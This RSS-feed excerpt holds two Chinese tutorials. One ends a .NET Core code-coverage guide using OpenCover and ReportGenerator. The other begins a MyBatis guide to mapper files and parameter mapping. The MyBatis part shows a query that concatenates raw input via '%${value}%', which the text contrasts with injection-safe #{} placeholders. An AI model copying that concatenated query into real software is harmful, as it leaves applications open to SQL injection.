&lt;h2&gt;单元测试代码覆盖率&lt;/h2&gt;
&lt;p&gt;　　测试代码覆盖率是对单元测试的一种度量，可以用来衡量单元测试是否达标，一般将代码测试目标定到80%-90%之间，为了保证代码覆盖率，在写测试用例时就要从语句覆盖、条件覆盖、路径覆盖等方面进行充分考虑。&lt;br/&gt;　　而.Net Core中如何在测试时计算代码覆盖率呢？如果使用VS的企业版，那么VS自带了代码覆盖率分析工具：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704162652998-75466154.png&quot; alt=&quot;&quot;/&gt;　&lt;/p&gt;
&lt;p&gt;　　详情参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/visualstudio/test/using-code-coverage-to-determine-how-much-code-is-being-tested&quot; target=&quot;_blank&quot;&gt;https://docs.microsoft.com/en-us/visualstudio/test/using-code-coverage-to-determine-how-much-code-is-being-tested&lt;/a&gt;&lt;br/&gt;　　　　　　　&lt;a href=&quot;https://github.com/Microsoft/vstest-docs/blob/master/docs/analyze.md#coverage&quot; target=&quot;_blank&quot;&gt;https://github.com/Microsoft/vstest-docs/blob/master/docs/analyze.md#coverage&lt;/a&gt;&lt;br/&gt;　　&lt;span&gt;注：VS集成了MSTest，所以代码覆盖分析工具对MSTest支持非常好，但对xUnit.Net的支持如何笔者未进行测试。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　对于xUnit.net来说，要分析测试代码覆盖率还可以通过“OpenCover”和“ReportGenerator”工具完成，下面就介绍如何通过这两个工具完成代码覆盖率的分析：&lt;br/&gt;　　1. 下载并安装OpenCover，在OpenCover的GitHub上下载最新release的zip包，并解压缩到指定目录下，并将OpenCover目录添加到环境变量中：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704162813951-336043599.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　地址：&lt;a href=&quot;https://github.com/OpenCover/opencover/releases&quot; target=&quot;_blank&quot;&gt;https://github.com/OpenCover/opencover/releases&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　2. 通过命令行使用OpenCover来完成覆盖率分析：&lt;br/&gt;　　OpenCover有许多参数，具体参考：&lt;a href=&quot;https://github.com/OpenCover/opencover/wiki/Usage&quot; target=&quot;_blank&quot;&gt;https://github.com/OpenCover/opencover/wiki/Usage&lt;/a&gt;&lt;br/&gt;　　在本例中，仅需要指定目标程序是dotnet.exe，目标程序参数是test(注：.Net Core的测试功能实际上是用.Net Core的CLI命令 dotnet test完成的)，另外指定输出文件名，register参数用于注册代码分析器默认使用user即可，-filter参数用于过滤不需要分析覆盖率的程序集和类型，-oldstyle是为了支持.Net Core程序添加的参数(详见：&lt;a href=&quot;https://github.com/OpenCover/opencover/issues/595&quot; target=&quot;_blank&quot;&gt;https://github.com/OpenCover/opencover/issues/595&lt;/a&gt;)&lt;br/&gt;　　另外为了能够满足测试需要在相关项目文件中添加以下节点(详见：&lt;a href=&quot;https://github.com/Microsoft/vstest/issues/800&quot; target=&quot;_blank&quot;&gt;https://github.com/Microsoft/vstest/issues/800&lt;/a&gt;)：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;PropertyGroup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;DebugType&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;full&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;DebugType&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;PropertyGroup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　最后在项目目录下执行以下命令：&lt;br/&gt;　　OpenCover.Console.exe -target:&quot;dotnet.exe&quot; -targetargs:&quot;test&quot; -output:coverage.xml -register:user -filter:&quot;+[*]* -[*Moq]* -[xunit*]*&quot; -oldstyle&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704162956236-1843060408.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　生成的结果：　&lt;/p&gt;
&lt;p&gt;　　4. 通过ReportGenerator生成可读报表：&lt;br/&gt;　　下载地址：&lt;a href=&quot;https://github.com/danielpalme/ReportGenerator/releases&quot; target=&quot;_blank&quot;&gt;https://github.com/danielpalme/ReportGenerator/releases&lt;/a&gt;&lt;br/&gt;　　&lt;span&gt;注：下载解压后将ReprotGenerator的目录添加到环境变量，以便使用。&lt;/span&gt;&lt;br/&gt;　　执行以下命令：&lt;br/&gt;　　ReportGenerator.exe &quot;-reports:coverage.xml&quot; &quot;-targetdir:report&quot;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704163041098-565791992.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　生成内容：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704163100735-877184712.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　打开index.htm文件：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704163121047-313094511.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　5. 在项目中创建一个bat文件，用于保存代码覆盖率检测和报表生成命令，便于使用：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704163142263-597390891.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;小结&lt;/h2&gt;
&lt;p&gt;　　本文主要介绍了如何使用xUnit.net测试框架完成.Net Core程序的单元测试，以及通过Moq框架来模拟测试目标的相关依赖，避免了其它组件对测试代码的影响。&lt;br/&gt;　　文章的最后介绍了如何使用开源工具OpenCover和ReportGenerator工具来实现.Net Core单元测试代码覆盖率分析，这种方案相对VS企业版自带的工具使用上要麻烦一些，但好在工具都是开源的，对持续集成也有比较好的支持，所以不失为一种好的解决方案。&lt;br/&gt;　　单元测试仅能保证软件的最小可执行单元是正确的，真正的软件是由这些最小可执行单元组成的一个整体，单元的正确性无法保证整体的正确性，下篇文章将对.Net Core的集成测试进行介绍。&lt;/p&gt;
&lt;p&gt;本文链接：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: 好代码是管出来的——.Net Core中的单元测试与代码覆盖率&quot; href=&quot;https://www.cnblogs.com/selimsong/p/9263957.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/selimsong/p/9263957.html&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;测试代码：&lt;a href=&quot;https://github.com/yqszt/xUnitTestDemo&quot; target=&quot;_blank&quot;&gt;https://github.com/yqszt/xUnitTestDemo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;br/&gt;　　&lt;a href=&quot;https://en.wikipedia.org/wiki/Unit_testing&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/Unit_testing&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/core/testing/&quot; target=&quot;_blank&quot;&gt;https://docs.microsoft.com/en-us/dotnet/core/testing/&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://github.com/aspnet/Home/wiki/Engineering-guidelines#unit-tests-and-functional-tests&quot; target=&quot;_blank&quot;&gt;https://github.com/aspnet/Home/wiki/Engineering-guidelines#unit-tests-and-functional-tests&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;http://asp.net-hacker.rocks/2017/03/31/unit-testing-with-dotnetcore.html&quot; target=&quot;_blank&quot;&gt;http://asp.net-hacker.rocks/2017/03/31/unit-testing-with-dotnetcore.html&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://stackoverflow.com/questions/261139/nunit-vs-mbunit-vs-mstest-vs-xunit-net&quot; target=&quot;_blank&quot;&gt;https://stackoverflow.com/questions/261139/nunit-vs-mbunit-vs-mstest-vs-xunit-net&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;http://blog.ploeh.dk/2010/04/26/WhyImmigratingfromMSTesttoxUnit.net/&quot; target=&quot;_blank&quot;&gt;http://blog.ploeh.dk/2010/04/26/WhyImmigratingfromMSTesttoxUnit.net/&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/core/tools/dotnet-test?tabs=netcore21&quot; target=&quot;_blank&quot;&gt;https://docs.microsoft.com/en-us/dotnet/core/tools/dotnet-test?tabs=netcore21&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://stackoverflow.com/questions/38425936/how-to-measure-code-coverage-in-asp-net-core-projects-in-visual-studio&quot; target=&quot;_blank&quot;&gt;https://stackoverflow.com/questions/38425936/how-to-measure-code-coverage-in-asp-net-core-projects-in-visual-studio&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;http://dotnetliberty.com/index.php/2016/02/22/moq-on-net-core/&quot; target=&quot;_blank&quot;&gt;http://dotnetliberty.com/index.php/2016/02/22/moq-on-net-core/&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://github.com/moq/moq4&quot; target=&quot;_blank&quot;&gt;https://github.com/moq/moq4&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://stackoverflow.com/questions/41384459/opencover-reports-missing-pdbs-when-pdbs-are-present-xunit-net-core&quot; target=&quot;_blank&quot;&gt;https://stackoverflow.com/questions/41384459/opencover-reports-missing-pdbs-when-pdbs-are-present-xunit-net-core&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://github.com/OpenCover/opencover&quot; target=&quot;_blank&quot;&gt;https://github.com/OpenCover/opencover&lt;/a&gt;&lt;br/&gt;　　&lt;a href=&quot;https://github.com/danielpalme/ReportGenerator&quot; target=&quot;_blank&quot;&gt;https://github.com/danielpalme/ReportGenerator&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a id=&quot;post_title_link_8675028&quot; href=&quot;https://www.cnblogs.com/selimsong/p/8675028.html&quot;&gt;好代码是管出来的——浅谈.Net Core的代码管理方法与落地（更新中...）&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 04 Jul 2018 16:30:00 +0000</pubDate>
<dc:creator>7m鱼</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/selimsong/p/9263957.html</dc:identifier>
</item>
<item>
<title>Mybatis学习系列（二）Mapper映射文件 - 仍是少年</title>
<link>http://www.cnblogs.com/ashleyboy/p/9266134.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ashleyboy/p/9266134.html</guid>
<description>&lt;p&gt; Mapper映射文件，作用是用来配置SQL映射语句，根据不同的SQL语句性质，使用不同的标签，mapper文件中常用的标签有&amp;lt;iselect&amp;gt;、&amp;lt;insert&amp;gt;、&amp;lt;update&amp;gt;、&amp;lt;delete&amp;gt;&lt;/p&gt;
&lt;h2&gt;常见增删改查示例&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; namespace:此处使用包名+文件名 的形式 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;com.sl.mapper.ProductMapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt;select – 映射查询语句
       id:唯一标识 parameterType:参数类型，此处是根据id查询，类型为int resultType:返回值类型， 
        #{id}： 参数 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProduct&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select * from products where id = #{id}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; insert – 映射插入语句
      注： sql中参数最好和po中属性命名一致   
     &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insertProduct&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        insert into products(name,description,UnitPrice,IsNew)
        values(#{name},#{description},#{UnitPrice},#{IsNew})
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; update – 映射更新语句 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateProduct&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        update products set UnitPrice = #{UnitPrice},IsNew=#{IsNew} where id=#{id}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; delete – 映射删除语句&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteProduct&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        delete from products where id=#{id}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('1ca53671-5021-4b15-b3bb-e91901542f3e')&quot; readability=&quot;34.5&quot;&gt;&lt;img id=&quot;code_img_closed_1ca53671-5021-4b15-b3bb-e91901542f3e&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_1ca53671-5021-4b15-b3bb-e91901542f3e&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('1ca53671-5021-4b15-b3bb-e91901542f3e',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_1ca53671-5021-4b15-b3bb-e91901542f3e&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TestClient {

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义会话SqlSession&lt;/span&gt;
    SqlSession session = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

    @Before
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; init() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义mabatis全局配置文件&lt;/span&gt;
        String resource = &quot;SqlMapConfig.xml&quot;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 加载mybatis全局配置文件
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; InputStream inputStream =
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; TestClient.class.getClassLoader().getResourceAsStream(resource);&lt;/span&gt;
&lt;span&gt;
        InputStream inputStream &lt;/span&gt;=&lt;span&gt; Resources.getResourceAsStream(resource);
        SqlSessionFactoryBuilder builder &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SqlSessionFactoryBuilder();
        SqlSessionFactory factory &lt;/span&gt;=&lt;span&gt; builder.build(inputStream);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 根据sqlSessionFactory产生会话sqlsession&lt;/span&gt;
        session =&lt;span&gt; factory.openSession();
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; select by id
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; @Test&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testSelectProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectProduct&quot;&lt;span&gt;;
        Product product &lt;/span&gt;= session.selectOne(statement, 1&lt;span&gt;);
        System.out.println(product);

        session.close();
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; insert
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; @Test&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testInsertProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.insertProduct&quot;&lt;span&gt;;
        Product product &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Product();
        product.setName(&lt;/span&gt;&quot;小酒馆&quot;&lt;span&gt;);
        product.setDescription(&lt;/span&gt;&quot;xxxx&quot;&lt;span&gt;);
        product.setIsNew(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        product.setUnitPrice(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; BigDecimal(1000&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; count =&lt;span&gt; session.insert(statement, product);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; System.out.println(product);&lt;/span&gt;
        session.commit();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; insert 需要commit&lt;/span&gt;
&lt;span&gt;        session.close();
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; update
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; @Test&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testUpdateProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.updateProduct&quot;&lt;span&gt;;
        Product product &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Product();
        product.setId(&lt;/span&gt;24&lt;span&gt;);
        product.setIsNew(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        product.setUnitPrice(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; BigDecimal(2000&lt;span&gt;));

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; count =&lt;span&gt; session.update(statement, product);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; System.out.println(product);&lt;/span&gt;
        session.commit();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; insert 需要commit&lt;/span&gt;
&lt;span&gt;        session.close();
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; update
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; @Test&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.deleteProduct&quot;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; count = session.delete(statement, 24&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; System.out.println(product);&lt;/span&gt;
        session.commit();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; insert 需要commit&lt;/span&gt;
&lt;span&gt;        session.close();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h2&gt;Mapper 输入参数映射配置&lt;/h2&gt;
&lt;p&gt;Mybatis中parameterType为输入参数类型，可以配置为基本数据类型、基本数据包装类型、或自定义数据类型（JavaBean），Sql语句中使用#{}或${}传入参数。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;#{}&lt;/span&gt;实现的是向prepareStatement中的预处理语句中设置参数值，sql语句中#{}表示一个占位符，使用占位符#{}可以防止sql注入，使用时不需要关心参数值的类型，mybatis将自动进行java类型和jdbc类型的转换。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;${}&lt;/span&gt;可以将参数拼接在sql中且不进行jdbc类型转换，${}可以接收简单类型值或pojo属性值，如果传入的是个简单类型，括号中只能是value，即：${value}:&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;     &amp;lt;!--&lt;/span&gt;&lt;span&gt; ${} sql拼接 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
     &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductByName&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;string&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      select * from products where name like '%${value}%'
     &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
     &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; #{} 参数化 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductByName2&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;string&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      select * from products where name like #{value}
     &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('bce6dac5-a997-49d8-a8e5-127954e5dd99')&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_bce6dac5-a997-49d8-a8e5-127954e5dd99&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_bce6dac5-a997-49d8-a8e5-127954e5dd99&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('bce6dac5-a997-49d8-a8e5-127954e5dd99',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_bce6dac5-a997-49d8-a8e5-127954e5dd99&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testSelectByProductName() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用like '%${value}%'&lt;/span&gt;
        String statement = &quot;com.sl.mapper.ProductMapper.selectProductByName&quot;&lt;span&gt;;
        List&lt;/span&gt;&amp;lt;Product&amp;gt; listProduct = session.selectList(statement,&quot;琶洲&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Product product : listProduct) {
            System.out.println(product);
        }
        
        System.out.println(&lt;/span&gt;&quot;***************************************************&quot;&lt;span&gt;);
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用 like #{value}&lt;/span&gt;
        String statement2 = &quot;com.sl.mapper.ProductMapper.selectProductByName2&quot;&lt;span&gt;;
        List&lt;/span&gt;&amp;lt;Product&amp;gt; listProduct2 = session.selectList(statement2,&quot;%国际%&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Product product : listProduct2) {
            System.out.println(product);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;映射基本数据类型&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProduct&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select * from products where id = #{id}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;映射基本数据类型时，也参数名也可用value代替，#{value}   即：  select * from products where id = #{id}&lt;/p&gt;
&lt;h3&gt;映射pojo对象&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; pojo &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
     &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductByPoJo&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      select * from products where unitprice&amp;gt;#{UnitPrice} and isnew =#{IsNew} 
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参数名必须与pojo对象属性一致，此处UnitPrice 与 IsNew为Product属性。&lt;/p&gt;
